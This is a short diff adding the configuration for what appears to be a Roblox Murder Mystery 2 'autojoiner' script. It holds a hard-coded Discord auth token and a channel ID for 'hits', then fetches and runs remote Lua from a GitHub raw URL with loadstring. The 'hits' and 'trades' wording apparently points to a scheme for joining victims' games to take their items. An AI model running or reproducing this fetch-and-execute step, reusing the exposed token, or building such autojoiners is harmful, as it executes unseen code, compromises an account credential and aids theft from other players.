@@ -1,0 +1,5 @@
+token = "ODYyNDE0NDg4MDE5NjY0ODk2.G-TBu6.SYMdyOFgW5hpdhVjFHvH0bz61_O2wI7x2dDYlg" -- Discord Token here (DISCORD AUTH TOKEN) TUTORIAL: https://www.youtube.com/watch?v=LnBnm_tZlyU
+channelId = "1341905771465670680" -- Channel ID that your hits are in. TUTORIAL: https://www.youtube.com/watch?v=YjiQ7CajAgg
+delay = 4 -- How many seconds it will wait to chat after loading is done. If you have problems with not getting trades, try making delay higher (I dont recommend higher than 5)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/MM2/refs/heads/main/autojoiner.lua'))()
